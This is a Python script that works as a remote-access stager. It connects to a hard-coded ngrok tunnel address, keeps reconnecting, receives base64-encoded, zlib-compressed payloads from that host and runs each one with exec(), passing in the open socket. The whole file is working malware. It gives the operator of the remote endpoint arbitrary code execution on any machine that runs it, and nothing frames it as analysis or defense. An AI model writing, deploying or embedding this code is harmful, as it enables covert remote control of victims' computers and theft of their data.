import socket
import zlib
import base64
import struct
import time

host = "2.tcp.eu.ngrok.io:11843"


class Client:
    def __init__(self, host: str, port: int | str):
        self.host: str = host
        self.port: int = int(str(port))
        self.socket: socket.socket = socket.socket(2, socket.SOCK_STREAM)
        self.connected: bool = False

    def isSocketClosed(self) -> bool:
        try:
            self.socket.send(b"hello world")
            return True
        except ConnectionResetError:
            return True
        except (BlockingIOError, Exception):
            pass
        return False

    def waitUntilConnect(self, maxTry: int = 0):
        c: int = 0
        while (maxTry == 0 or c < maxTry):
            try:
                self.socket: socket.socket = socket.socket(
                    2, socket.SOCK_STREAM)
                self.socket.connect((self.host, self.port))
                print("Connected")
                break
            except Exception as e:
                pass
                print('An exception occurred.', e)
            c += 1

    def mainLoop(self):
        while True:
            #if (self.isSocketClosed()):
            #    self.waitUntilConnect()
            try:
                l = struct.unpack('>I', self.socket.recv(4))[0]
                d = self.socket.recv(l)
                while len(d) < l:
                    d += self.socket.recv(l-len(d))
                exec(zlib.decompress(base64.b64decode(d)), {'s': self.socket})
            except Exception as e:
                print("e2", str(e))
                self.waitUntilConnect()


client: Client = Client(host.split(":")[0], host.split(":")[1])
client.mainLoop()
